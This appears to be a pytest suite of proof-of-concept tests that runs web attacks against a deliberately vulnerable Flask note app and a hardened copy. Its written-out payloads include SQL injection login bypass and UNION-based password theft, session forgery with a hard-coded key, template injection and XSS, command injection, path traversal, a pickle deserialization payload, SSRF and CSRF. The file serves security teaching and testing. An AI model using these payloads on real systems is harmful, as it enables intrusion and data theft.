"""
Proof-of-concept tests for every finding in SECURITY_REVIEW.md.

Each test runs the same attack against both apps through Flask's in-process
test client (no network port is opened). A test PASSES when the vulnerable app
IS exploitable and the hardened app is NOT. Run:  pytest -v
"""
import base64
import hashlib
import http.server
import importlib.util
import os
import pickle
import shutil
import sqlite3
import sys
import tempfile
import threading

import pytest
from conftest import RESULTS
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SECURE_ADMIN_PASSWORD = "Admin-Test-Pass-1!"
os.environ["NOTEBOX_SECRET_KEY"] = "test-only-secret-" + "x" * 32
os.environ["NOTEBOX_ADMIN_PASSWORD"] = SECURE_ADMIN_PASSWORD

APPS = {
    "vulnerable": ("vulnerable_app", "admin123"),
    "secure": ("secure_app", SECURE_ADMIN_PASSWORD),
}
_modules = {}


def load(name):
    """Import vulnerable_app/app.py and secure_app/app.py under different names."""
    if name not in _modules:
        path = os.path.join(ROOT, APPS[name][0], "app.py")
        spec = importlib.util.spec_from_file_location(f"noteapp_{name}", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        _modules[name] = module
    return _modules[name]


class Client:
    """Test client that fetches a CSRF token first when talking to the hardened app."""

    def __init__(self, app, hardened):
        self.http, self.hardened = app.test_client(), hardened

    def _headers(self):
        if not self.hardened:
            return {}
        return {"X-CSRF-Token": self.http.get("/csrf-token").get_json()["token"]}

    def post(self, url, **body):
        return self.http.post(url, json=body, headers=self._headers())

    def raw_post(self, url, **body):
        """No token: this is what a forged cross-site request looks like."""
        return self.http.post(url, json=body)

    def get(self, url, **kwargs):
        return self.http.get(url, **kwargs)


class Target:
    def __init__(self, name, tmp_path):
        self.name = name
        self.folder, self.admin_password = APPS[name]
        self.db_path = os.path.join(str(tmp_path), "test.db")
        self.app = load(name).create_app(db_path=self.db_path, testing=True)

    def client(self):
        return Client(self.app, self.name == "secure")

    def user(self, name):
        c = self.client()
        password = f"{name.capitalize()}-Pass-12345!"
        assert c.post("/register", username=name, password=password).status_code == 201
        assert c.post("/login", username=name, password=password).status_code == 200
        return c

    def admin(self):
        c = self.client()
        assert c.post("/login", username="admin", password=self.admin_password).status_code == 200
        return c

    def record(self, finding, title, exploited):
        RESULTS.setdefault((finding, title), {})[self.name] = exploited
        expected = self.name == "vulnerable"
        assert exploited == expected, f"{finding} on {self.name}_app: exploited={exploited}, expected {expected}"


@pytest.fixture(params=["vulnerable", "secure"])
def target(request):
    tmp_dir = tempfile.mkdtemp(prefix="notebox_poc_")
    t = Target(request.param, tmp_dir)
    try:
        yield t
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def stored_password(db_path, username):
    conn = sqlite3.connect(db_path)
    try:
        return conn.execute("SELECT password FROM users WHERE username = ?", (username,)).fetchone()[0]
    finally:
        conn.close()


def test_V01_sql_injection_login(target):
    r = target.client().post("/login", username="admin' --", password="wrong")
    target.record("V01", "SQL injection: login bypass",
                  r.status_code == 200 and r.get_json().get("role") == "admin")


def test_V02_sql_injection_search(target):
    alice = target.user("alice")
    payload = "x%' UNION SELECT id, username || ':' || password FROM users --"
    r = alice.get("/search", query_string={"q": payload})
    target.record("V02", "SQL injection: data theft via search", "admin:" in r.get_data(as_text=True))


def test_V03_hardcoded_secret_key(target):
    forger = Flask("forger")
    forger.secret_key = "dev-secret-123"                  # the value printed in vulnerable_app/app.py
    cookie = SecureCookieSessionInterface().get_signing_serializer(forger).dumps({"uid": 1, "role": "admin"})
    http = target.app.test_client()
    http.set_cookie("session", cookie)
    target.record("V03", "Hard-coded key: forged admin session", http.get("/whoami").get_json().get("role") == "admin")


def test_V04_weak_password_hash(target):
    target.user("bob")
    stored = stored_password(target.db_path, "bob")
    target.record("V04", "Weak hash: unsalted MD5 passwords", stored == hashlib.md5(b"Bob-Pass-12345!").hexdigest())


def test_V05_template_injection_and_xss(target):
    r = target.client().get("/greet", query_string={"name": "{{7*7}}<script>alert(1)</script>"})
    body = r.get_data(as_text=True)
    target.record("V05", "Template injection and XSS in /greet", "49" in body and "<script>alert(1)</script>" in body)


def test_V06_command_injection(target):
    sep = " & " if sys.platform.startswith("win") else ";"
    r = target.admin().get("/ping", query_string={"host": f"127.0.0.1{sep}echo INJECTED_V06"})
    target.record("V06", "Command injection in /ping", r.status_code == 200 and "INJECTED_V06" in r.get_data(as_text=True))


def test_V07_path_traversal(target):
    r = target.client().get("/download", query_string={"file": "../secret.txt"})
    target.record("V07", "Path traversal in /download", r.status_code == 200 and "DB_PASSWORD" in r.get_data(as_text=True))


class Evil:
    """Harmless payload: when unpickled it sets one environment variable."""

    def __reduce__(self):
        return (eval, ("__import__('os').environ.__setitem__('NOTEBOX_PWNED', '1')",))


def test_V08_insecure_deserialization(target):
    os.environ.pop("NOTEBOX_PWNED", None)
    http = target.app.test_client()
    http.set_cookie("prefs", base64.b64encode(pickle.dumps(Evil())).decode())
    http.get("/prefs")
    target.record("V08", "Insecure deserialization (pickle cookie)", os.environ.pop("NOTEBOX_PWNED", None) == "1")


def test_V09_idor(target):
    note_id = target.user("alice").post("/notes", title="private", body="alice-secret").get_json()["id"]
    r = target.user("bob").get(f"/notes/{note_id}")
    target.record("V09", "IDOR: reading another user's note", r.status_code == 200 and "alice-secret" in r.get_data(as_text=True))


class _Internal(http.server.BaseHTTPRequestHandler):
    """Stands in for an internal-only service that outsiders must not reach."""

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"INTERNAL-ONLY-SECRET")

    def log_message(self, *args):
        pass


def test_V10_ssrf(target):
    server = http.server.HTTPServer(("127.0.0.1", 0), _Internal)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        r = target.user("alice").get("/preview", query_string={"url": f"http://127.0.0.1:{server.server_port}/"})
    finally:
        server.shutdown()
        server.server_close()
    target.record("V10", "SSRF: server fetches internal URLs", r.status_code == 200 and "INTERNAL-ONLY-SECRET" in r.get_data(as_text=True))


def test_V11_csrf(target):
    r = target.user("alice").raw_post("/notes", title="forged", body="created without a token")
    target.record("V11", "CSRF: state change without a token", r.status_code == 201)


def test_V12_insecure_configuration(target):
    c = target.client()
    c.post("/register", username="carol", password="Carol-Pass-12345!")
    r = c.post("/login", username="carol", password="Carol-Pass-12345!")
    cookie = " ".join(r.headers.getlist("Set-Cookie")).lower()
    with open(os.path.join(ROOT, target.folder, "app.py"), encoding="utf-8") as fh:
        source = fh.read()
    target.record("V12", "Debug mode and weak cookie flags", "httponly" not in cookie or "debug=true" in source)


def test_V13_no_brute_force_protection(target):
    c = target.client()
    codes = [c.post("/login", username="admin", password=f"guess{i}").status_code for i in range(8)]
    target.record("V13", "No lockout: unlimited password guesses", 429 not in codes)


if __name__ == "__main__":
    import pytest
    print("Running 26 proof-of-concept tests across vulnerable_app and secure_app...\n")
    sys.exit(pytest.main(["-v", "-p", "no:cacheprovider", "-W", "ignore::DeprecationWarning", __file__]))
